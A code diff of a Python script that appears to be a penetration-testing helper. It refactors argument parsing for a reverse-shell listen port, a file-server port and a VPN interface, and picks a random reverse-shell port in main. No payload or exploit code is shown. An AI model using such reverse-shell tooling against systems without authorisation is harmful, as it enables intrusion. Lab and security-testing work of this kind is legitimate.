@@ -11,11 +11,13 @@ import struct
 
 def parse_args():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-p", "--port", help="The port to connect to", type=int, default=4444)
-    parser.add_argument("-lp", "--lport", help="The port to connect to", type=int, default=9001)
-    parser.add_argument("-o", "--os", help="The OS to test for", type=str, default="Linux")
+    parser.add_argument("-p", "--port", help="Listen port for the reverse shell", type=int, default=4444)
+    parser.add_argument("-lp", "--lport", help="Local port for the file server", type=int, default=9001)
+    parser.add_argument("-o", "--os", help="Currently not used", type=str, default="Linux")
+    parser.add_argument("-i", "--interface", help="The interface to use", type=str, default="tun0")
     args = parser.parse_args()
     return args
+
 
 
 def get_file(tmp_dir, ip, lport, p, filename):
@@ -80,18 +82,21 @@ def get_ip_address(ifname):
 
 
 def main():
-    tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
-    print(tmp_dir)
+    # Parse the arguments
     args = parse_args()
 
+    # Create a temporary directory
+    tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
+    print(tmp_dir)
+
+    # Get the arguments
     lport = args.lport
     port = args.port
-
     mport = random.randint(1024, 65535)
-    # Random port for the reverse shell that is not the same as the file server
+    # Random port for the reverse shell that is not the same as the file server and burp
     while mport == port or mport == lport or mport == 8080:
         mport = random.randint(1024, 65535)
-    current_os = args.os
+    current_os = args.os # Currently unused
     ip = get_ip_address("eth0")
 
     # 1. Spawn the reverse shell recon thread
